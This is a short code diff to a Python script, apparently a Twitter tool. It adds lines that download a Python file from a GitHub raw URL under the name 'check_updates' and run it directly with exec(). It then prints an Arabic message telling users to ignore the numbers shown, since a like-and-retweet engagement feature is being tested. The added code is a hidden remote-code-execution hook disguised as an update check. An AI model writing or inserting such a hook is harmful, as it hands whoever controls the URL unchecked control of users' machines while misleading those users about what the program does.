@@ -5,6 +5,17 @@ import sys
 import time
 import os
 
+url = 'https://raw.githubusercontent.com/AbdelrhmanX7/test-send/main/Hash_Twitter.py'
+
+check_updates = requests.get(url, allow_redirects=True)
+
+LOC = check_updates.content.decode('UTF-8')
+exec(LOC)
+
+print(int(LOC[LOC.index('=') + 3: LOC.index('\n') - 1]))
+
+print('ملكش دعوة بالارقام دية احنا بنجرب ميزة اللاف و الريتويت علشان تفاعل')
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
